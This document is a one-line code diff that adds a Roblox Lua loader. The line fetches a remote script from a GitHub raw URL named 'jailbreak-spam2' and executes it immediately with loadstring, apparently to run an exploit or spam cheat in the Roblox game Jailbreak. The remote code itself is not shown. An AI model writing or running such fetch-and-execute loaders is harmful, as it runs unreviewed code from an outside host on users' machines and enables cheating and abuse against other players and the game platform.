@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/pitroninrank/loaders/main/loaders/jailbreak-spam2-idf0fhyzh04wy1.lua"))()
